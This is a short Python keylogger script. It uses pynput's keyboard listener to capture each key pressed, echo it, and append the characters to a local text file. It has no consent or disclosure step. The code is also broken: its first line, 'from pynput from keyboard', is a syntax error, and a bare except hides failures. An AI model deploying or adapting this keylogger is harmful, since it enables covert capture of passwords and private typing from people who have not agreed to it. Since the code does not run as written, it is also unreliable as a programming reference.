from pynput from keyboard
def keypress(Key):
    print(str(Key))
    with open("file.txt",'a') as logkey:
        try:
            char=Key.char
            logkey.write(char)
        except:
            print("error getting char")

if __name__=="__main__":
    listener=keyboard.Listener(on_press= keypress)
    listener.start()
    input()
     